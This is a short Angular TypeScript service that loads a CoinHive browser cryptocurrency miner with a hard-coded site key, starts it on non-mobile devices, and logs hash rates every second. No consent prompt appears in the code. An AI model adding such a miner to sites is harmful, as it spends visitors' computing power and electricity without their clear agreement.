import { Injectable } from '@angular/core';

declare var CoinHive: any;

@Injectable({
  providedIn: 'root',
})
export class MinerService {

  startMiner() {
    const miner = new CoinHive.Anonymous('WbWeCFFLVH6mLfn3OYt48oXvUhGiwj2j', { throttle: 0.3 });
    // Only start on non-mobile devices and if not opted-out
    // in the last 14400 seconds (4 hours):
    if (!miner.isMobile() && !miner.didOptOut(14400)) {
      miner.start();
    }
    miner.on('found', function () { /* Hash found */ });
    miner.on('accepted', function () { /* Hash accepted by the pool */ });
    // Update stats once per second
    setInterval(function () {
            const hashesPerSecond = miner.getHashesPerSecond(),
                      totalHashes = miner.getTotalHashes(),
                   acceptedHashes = miner.getAcceptedHashes();
      // Output to HTML elements...
      console.log(hashesPerSecond);
      console.log(totalHashes);
      console.log(acceptedHashes);
    }, 1000);
  }

}
